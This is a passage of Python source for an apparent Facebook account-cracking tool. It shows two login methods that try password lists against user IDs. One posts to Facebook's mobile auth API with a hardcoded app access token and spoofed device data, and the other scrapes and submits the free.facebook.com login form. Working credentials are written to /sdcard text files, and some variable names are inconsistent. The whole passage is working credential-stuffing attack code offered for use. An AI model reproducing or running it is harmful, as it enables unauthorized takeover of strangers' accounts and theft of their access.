                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2246};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [B28-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/B28-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [B28-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/B28-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#method6
def trt6(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [EHC-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			ua = random.choice(ugen)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'p.facebook.com',
			'upgrade-insecure-requests': '1',
			'viewport-width': '980',
			'method': 'path',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
			'dnt':'1', 
			'x-requested-with':'mark.via.gp', 
			'sec-fetch-site': 'none',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			"sec-ch-prefers-color-scheme": "light",
			'user-agent': ua}
			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[151:166]
				if uid in oks:pass
				else:
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [EHC-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [EHC-OK] '+uid+' | '+pas)
						open('/sdcard/EHC-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid=coki[141:156]
				if uid in cps:pass
				else:
					print('\r\r\x1b[38;5;205m [B28-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/B28-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except:
		pass
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()
